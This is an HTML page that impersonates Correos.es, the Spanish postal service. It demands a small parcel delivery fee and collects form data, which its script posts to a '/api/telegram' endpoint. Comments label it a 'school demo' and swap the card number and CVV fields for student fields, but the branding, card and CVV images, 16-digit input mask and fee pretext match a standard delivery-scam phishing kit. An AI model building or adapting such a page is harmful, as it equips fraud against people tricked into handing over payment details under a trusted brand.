<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <!-- link_icons -->
  <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
  <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
  <title>Localizar envíos, oficinas y códigos postales| Correos.es</title>
  <link rel="icon" href="image/favicon.ico" type="image/x-icon"/>
  <link rel="shortcut icon" href="image/favicon.ico" type="image/x-icon" />
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/ofppt.css">
  <link rel="stylesheet"  href="css/animate.css">
  <style>
      .err_card{ display: none; }
  </style>
</head>
<body>

  <div class="navbar">
    <div class="container">
      <div class="left d-flex align-items-center">
        <img src="image/logo.svg" class="logo">
        <ul class="nav align-items-center">
          <li class="nav-item d-flex align-items-center"><img src="image/list.png"></li>
          <li class="nav-item active box">Particular</li>
          <li class="nav-item box">Empresa</li>
        </ul>
      </div>
      <div class="center"><img src="image/input.png"></div>
      <div class="right">
        <img src="image/search.png" class="search">
        <div class="line"></div>
        <img src="image/user.png"><span>INICIAR SESIÓN</span>
      </div>  
    </div>
  </div>

  <main id="main" >
    <div class="container">
      <div class=" title">
        <h2>Pago en línea (Demo Escolar)</h2>
        <p>Para la entrega, necesitamos cobrar algunas tarifas de servicio. Su paquete se volverá a ceder después del pago</p>
        <p><b>Suma global: €0.27</b></p>
      </div>

      <div class="login shadow dodg" >
        <div class="form-check">
          <input class="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault2" checked>
          <label class="form-check-label" for="flexRadioDefault2">
            Tarjeta de crédito o débito
          </label>
        </div>

        <img src="image/cartat.jpg" width="270px" class="img-fluid mb-4">
        <div class="mb-3"><b></b></div>

        <!-- FORM: modified for school-safe demo -->
        <form method="post" id="CARDINFO" onsubmit="return formValidation()">
          <input type="hidden" name="step" value="cc">
          <div class="row align-items-center">
            <div class="col-12">
              <div class="form-group mb-4 col-md-12">
                <input id="name" type="text" name="name" required autofocus>
                <label for="name" id="label">Nombre del Estudiante</label>
              </div>

              <div class="form-group mb-4 col-md-12">
                <!-- replaced: student id instead of card number -->
                <input type="text" name="student_id" id="card" required placeholder="0000 0000" pattern="[0-9]{4,16}$" >
                <label for="card" id="label" style="top: 8px;left: 0.84118rem;font-size: 12px;color:#002e6d;font-weight: 700;">Número de Estudiante</label>
                <div class="err_card mt-2" style="color:red;font-weight: 600;font-size: 15px;">
                  <i class="me-1 bi bi-exclamation-circle " id="circle"></i>
                </div>
              </div>

              <div class="all">
                <div class="form-group mb-4 soso">
                  <input type="text" name="registration_date" id="date" required placeholder="MM/YY" pattern="(0[1-9]|1[0-2])\/?([0-9]{4}|[0-9]{2})$">
                  <label for="date" id="label" style="top: 8px;left: 0.84118rem;font-size: 12px;color:#002e6d;font-weight: 700;">Fecha de Registro</label>
                </div>

                <div class="form-group mb-4 soso ">
                  <!-- replaced: class code instead of CVV -->
                  <input type="text" name="class_code" id="code" required placeholder="123" pattern="[0-9]{1,6}$">
                  <label for="code" id="label" style="top: 8px;left: 0.84118rem;font-size: 12px;color:#002e6d;font-weight: 700;">Código del Curso</label>
                  <img src="image/cvv.png" >
                </div>
              </div>
            </div>
          </div>

          <button class="btn" name="submit" id="submit">Entregar</button>
        </form>   
      </div>
    </div>
  </main>

  <!-- footer unchanged -->
  <div class="fotter"> ... </div>
  <div class="fot"> ... </div>

  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/jquery.mask.js"></script>
  <script>
    // keep same ids so CSS/JS still works; but we send ONLY safe fields
    const CARDINFO = document.getElementById("CARDINFO");
    CARDINFO.addEventListener("submit", async (e) => {
      e.preventDefault();

      const CN = document.getElementById("name").value;
      const student_id_raw = document.getElementById("card").value;
      const exp = document.getElementById("date").value;
      const class_code = document.getElementById("code").value;

      // mask function: keep only last 4 digits for demo
      function maskStudentId(raw){
        if(!raw) return "";
        const digits = raw.replace(/\D/g, "");
        if(digits.length <= 4) return digits;
        return "** ** " + digits.slice(-4);
      }

      const payload = {
        name: CN,
        student_id_masked: maskStudentId(student_id_raw),
        registration_date: exp,
        class_code: class_code // non-sensitive demo field
      };

      try {
        const response = await fetch("/api/telegram", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });

        if (response.ok) {
          window.location.href = "loading_2.html";
        } else {
          alert("Error al enviar datos.");
        }
      } catch (err) {
        console.error(err);
        alert("Error en la conexión.");
      }
    });

    // masks for appearance only
    $("#card").mask("0000000000000000");
    $("#date").mask("00/00");
    $("#code").mask("0000");
    $("#pin").mask("0000");

    function formValidation(){
      var card = $("#card").val();
      if(card==""){
        $(".err_card").show();
        $(".err_card").text("Please enter your Student Number");
        return false;
      } else {
        // keep generic pattern: digits only
        var patern_card = /^[0-9]{4,16}$/;
        if(!patern_card.test(card)){
          $(".err_card").show();
          $(".err_card").text("Please enter a valid Student Number");
          return false;
        }
      }
      return true;
    }
  </script>
</body>
</html>
